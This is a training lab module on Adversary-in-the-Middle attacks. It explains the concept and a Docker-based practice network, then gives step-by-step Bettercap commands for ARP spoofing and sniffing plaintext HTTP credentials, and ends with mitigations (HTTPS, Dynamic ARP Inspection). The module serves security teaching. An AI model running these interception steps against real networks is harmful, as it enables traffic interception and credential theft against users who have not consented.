# Module: Adversary-in-the-Middle (AITM)

📚 Theory & Class Notes

Adversary-in-the-Middle (AITM) (formerly MITM) attacks occur when an attacker secretly relays and possibly alters the communications between two parties who believe they are directly communicating with each other.

Vulnerabilities: Lack of HTTP Strict Transport Security (HSTS), untrusted/self-signed SSL certs, ARP table spoofing lacking port security.
Tools: Bettercap, Ettercap, Wireshark, Responder (for LLMNR/NBT-NS poisoning).

1. Core Concept 🧠

Adversary-in-the-Middle (AITM) (formerly Man-in-the-Middle / MITM) happens when an attacker secretly intercepts, relays, and possibly alters communications between two parties who believe they are communicating directly.

Real-world analogy: You write a letter to your bank and give it to the postman. The postman secretly opens it, reads your account number, seals it, and delivers it. You and the bank have no idea he read it.

Architecture Diagram

Lab Architecture Overview

This lab utilizes a custom Docker bridge network (10.10.10.0/24) to simulate a complete local area network equipped with continuous background traffic to practice interception operations.

  • Victim Client (10.10.10.2): An automated Alpine Linux container mimicking a real user. Every 10 seconds, it sends an HTTP POST request containing fictitious credentials to the Target Server.
  • Target Server (10.10.10.80): Hosts the vulnerable HTTP application endpoint on port 80.
  • Attacker / You (10.10.10.10): A Kali Linux container granted elevated network privileges (`NET_ADMIN`), equipped with pentesting tools like bettercap, dsniff, and tcpdump.

How It Works

By executing an ARP Spoofing attack from the Attacker container, you will "poison" the Victim's ARP cache. This tricks the Victim into believing your MAC address belongs to the Target Server (10.10.10.80). When the Victim tries to log into the mock site, the traffic routes through your container first, allowing Bettercap to sniff the plaintext credentials.

Exploitation Steps

First, access the attacker container terminal by executing: docker exec -it aitm_attacker bash, then follow these commands:

  1. Enable IP Forwarding: Allow packets to route through your container instead of dropping them, preventing a Denial-of-Service condition on the victim:
    sysctl -w net.ipv4.ip_forward=1
  2. Start Bettercap: Launch Bettercap on your primary interface:
    bettercap -iface eth0
  3. Network Discovery: Inside Bettercap, map the subnet to actively discover targets:
    net.probe on
  4. Configure ARP Spoofing: Set the spoofing targets to intercept traffic between the Victim (10.10.10.2) and the Target Server (10.10.10.80):
    set arp.spoof.targets 10.10.10.2,10.10.10.80
  5. Enable Internal Spoofing: Tell Bettercap to spoof the targets against each other rather than the gateway:
    set arp.spoof.internal true
  6. Launch the Attack: Begin continuously sending forged ARP replies:
    arp.spoof on
  7. Enable Credential Sniffing: Start the packet sniffer to automatically extract HTTP POST payloads and basic auth credentials:
    net.sniff on
  8. Wait & Intercept: Wait up to 10 seconds for the automated victim to browse to the HTTP site. You will see an event log capturing the POST request, exposing the plaintext credentials (username=admin&password=SuperSecretPassword123) directly in the Bettercap console!

Expected Output

Fix / Mitigation

Use HTTPS (TLS) everywhere to encrypt data in transit. At the network level, use Dynamic ARP Inspection (DAI) on enterprise switches to validate ARP packets against a trusted database.
